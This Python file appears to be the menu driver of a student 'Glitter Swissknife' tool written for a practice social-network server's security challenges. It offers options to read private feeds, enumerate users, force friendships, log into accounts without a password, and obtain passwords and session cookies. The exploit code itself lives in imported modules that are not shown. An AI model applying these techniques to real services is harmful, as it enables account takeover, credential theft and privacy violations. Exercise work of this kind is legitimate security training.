##############
#  LIBRARY   #
##############

import socket
import login
import like
import post
import comment
import randomLike
import randomComment
import printFeed
import getID
import wow
import commandBank
import friend
import hackLogin
import password
import cookie

##############
#   GLOBAL   #
##############

feed = ""
stuck_feed = ""
my_id = ""
list_id = []
stuck_list = []

def connect():
    """
    function that open socket of TCP and call the other functions
    :return: none
    """
    # INITIALIZE
    global feed, my_id, list_id, stuck_list, stuck_feed
    SERVER_IP = "44.224.228.136"     # the ip of the server
    SERVER_PORT = 1336               # the port of the server
    msg = ""
    cont = True
    EXIT = False
    user_id = ""                    # the user id from the login

    with socket.socket() as sock:     # Create a TCP socket
        server_address = (SERVER_IP, SERVER_PORT)
        sock.connect(server_address)
        print("Welcome to Glitter Swissknife!")
        while EXIT == False:
            try:
                my_id = login.login(sock)  # login to glitter and return the id of user
                EXIT = True
            except Exception as e:
                print("The login failed!")
                EXIT = False
        print("Logged in!")
        try:
            # get the feed of the user and a list of the glit id's
            list_id, feed = printFeed.show_feed(str(my_id), sock)
        except Exception as e:
            print("The account may not have any posts of there own!")

        # save the feed data
        stuck_feed = feed
        stuck_list = list_id
        while cont == True:
            print_menu()                # print the menu
            choice = int(input("Please choose: "))
            cont = action(choice, sock)      # start the action you choose

def print_menu():
    """ function that print the menu """
    print("         ")
    print("---------")
    print("MAIN MENU:")
    print("---------")
    print("0. EXIT")
    print("1. Make many likes to a glit")
    print("2. Post a custom glit with not valid colors and data")
    print("3. Post a comment on glit with every data you would like (even if its not valid!)")
    print("4. Give like to a random account (can be private!)")
    print("5. Post a comment to a random account (can be private!)")
    print("6. Make friends (without need of accept!) ")
    print("7. Get the user id by entering username (working also on private accounts!)")
    print("8. Send wow (like secret like)")
    print("9. Make many wows to a glit")
    print("10. Print all the request bank")
    print("11. Prints lists of users (also working on private account!)")
    print("-----------")
    print("CHALLENGES: ")
    print("-----------")
    print("12. Print the feed by user_id (even if its private!) - SECURITY CHALLENGE!")
    print("13. Login to another account (without need of password) - LOGIN CHALLENGE!")
    print("14. Get the password of the account - PASSWORD CHALLENGE! ")
    print("15. Get the cookie of the account - COOKIE CHALLENGE! ")
    print("-------------------")
    print("SWITCH ACCOUNT  20")
    print("-------------------")

def action(choice, sock):
    """
    function that get your choice and active the option you choose
    :param choice: the option you choose
    :param sock: the socket
    :return: if i need to choose again and continue with the program
    :rtype: bool
    """
    # INITIALIZE
    global feed, my_id, list_id, stuck_feed, stuck_list
    glit_id = ""
    user_id = ""
    info = ""
    username = ""
    code = ""
    key = ""
    i = 1               # counter

    # OPTIONS
    if choice == 1:       # works only on yourself
        print(feed)
        glit_choice = int(input("Please choose: "))
        glit_id = list_id[glit_choice]      # gives the id of the glit chosen
        likes = int(input("Enter how many likes you want to send: "))
        like.send_like(sock, likes, glit_id, my_id)       # sends many likes to specific post

    elif choice == 2:
        post.postGlitt(sock, "try 3")  # post a glit with white on blue from year 2022 and the content try 3

    elif choice == 3:
        print(feed)
        glit_choice = int(input("Please choose: "))
        glit_id = list_id[glit_choice]  # gives the id of the glit chosen
        # post a comment on a glit with every header you would like
        comment.send_comment(sock, "apple", 3, glit_id, my_id)

    elif choice == 4:
        print(feed)
        glit_choice = int(input("Please choose: "))
        glit_id = list_id[glit_choice]  # gives the id of the glit chosen
        randomLike.random_like(sock, glit_id, my_id)  # send a like to random glit (can be private)

    elif choice == 5:
        print(feed)
        glit_choice = int(input("Please choose: "))
        glit_id = list_id[glit_choice]  # gives the id of the glit chosen
        randomComment.random_comment(sock, glit_id, my_id)  # send a comment to random glit (can be private)

    elif choice == 6:
        username = str(input("Enter the username: "))
        user_id = getID.get_id(sock, username)  # get the id of user by name
        friend.add_friend(sock, user_id, my_id)         # add a friend

    elif choice == 7:
        username = str(input("Enter the username: "))
        print("The user id is: " + getID.get_id(sock, username))          # get the id of user by name

    elif choice == 8:       # works only on yourself
        print(feed)
        glit_choice = int(input("Please choose: "))
        glit_id = list_id[glit_choice]  # gives the id of the glit chosen
        wow.send_wow(sock, my_id, glit_id)

    elif choice == 9:       # works only on yourself
        print(feed)
        glit_choice = int(input("Please choose: "))
        glit_id = list_id[glit_choice]  # gives the id of the glit chosen
        wows = int(input("Enter hoe many wows you want to send: "))
        wow.send_multi_wows(sock, my_id, glit_id, wows)

    elif choice == 10:
        # build the request of the command bank
        commandBank.show_commands(sock)

    elif choice == 11:
        while username != "error":
            username = getID.get_username(sock, i)  # get the username by the user id
            i += 1      # change the user id
            if username != "error":
                print("The username is: " + username)

    elif choice == 12:
        username = str(input("Enter the username: "))
        user_id = getID.get_id(sock, username)  # get the id of user by name
        new_feed(sock, user_id, username)
        print(feed)

    elif choice == 13:
        username = str(input("Enter the username: "))
        user_id = getID.get_id(sock, username)  # get the id of user by name
        reconnect(sock, 1, username)              # reconnect to account | mode: no password

    elif choice == 14:
        username = str(input("Enter the username: "))
        user_id = getID.get_id(sock, username)  # get the id of user by name
        code = password.get_password(sock, username, user_id)   # get the password by using the username and user id
        print("Password: " + code)

    elif choice == 15:
        # gets cookie by using site and the login parameters
        # -------------------------------------------------
        """
        username = str(input("Enter the username: "))
        user_id = getID.get_id(sock, username)  # get the id of user by name
        code = password.get_password(sock, username, user_id)  # get the password by using the username and user id
        key = cookie.get_cookie_site(sock, username, code)
        print("Cookie: " + key)
        """
        # gets the cookie by using app and only the username (410 request)
        # ----------------------------------------------------------------
        username = str(input("Enter the username: "))
        user_id = getID.get_id(sock, username)  # get the id of user by name
        key = cookie.get_cookie_app(sock, user_id, my_id)  # gets the cookie
        if key == "410#":
            key = "Already friends"
        print("Cookie: " + key)

    elif choice == 20:
        reconnect(sock, 0, username)  # reconnect to account | mode: default

    elif choice == 0:
        print("Bye!")
        return False        # end the program

    else:       # if the number is not valid
        print("You have to choose number between 0-15!")

    return True             # continue the program again


def new_feed(sock, user_id, username):
    """
    function that prints the new feed by using user id
    :param user_id: the user to show his feed
    :param sock: the socket
    :param my_id: my current id
    """
    global feed, my_id, list_id
    next_feed = ""
    reconnect(sock, 0, "none")      # mode: default
    print("feed of user: " + username + "(" + user_id + ")\n---------------------")
    list_id, feed = printFeed.show_feed(user_id, sock)  # prints the feed of the account (even if its private)

def reconnect(sock, mode, username):
    """
    function that reconnect with the login function
    :param my_id: the current id
    :param sock: socket
    """
    global feed, my_id, list_id
    EXIT = False

    kick = '200#{gli&&er}' + my_id + '##'
    kick = send(kick, sock)  # disconnect from last account
    clear_buffer(sock, kick)
    print("DISCONNECTED...")
    # RECONNECT TO ANOTHER ACCOUNT
    while EXIT == False:
        try:
            if mode == 0:   # login to glitter and return the id of user
                my_id = login.login(sock)
                # print(my_id)
            else:   # login to glitter (without password) and return the id of user
                my_id = hackLogin.login(sock, username)
            EXIT = True
        except Exception as e:
            print("The login failed!")
            EXIT = False
    try:
        list_id, feed = printFeed.show_feed(my_id, sock)  # prints the feed of the account (even if its private)
    except Exception as e:
        print("The account dose'nt have posts!")

def clear_buffer(sock, msg):
    """function that clean the buffer by spamming recv until the next important massage comes"""
    while msg[-2] != '#':
        msg = sock.recv(1024)
        msg = msg.decode()

def send(send_msg, sock):
    """
    function that sends the request and return the answer
    :param send_msg: the request
    :param sock: socket
    :return: the answer
    :rtype: str
    """
    send_msg = send_msg.encode()
    sock.send(send_msg)
    msg = sock.recv(1024)
    msg = msg.decode()
    return msg


def main():
    connect()

if __name__ == "__main__":
    main()
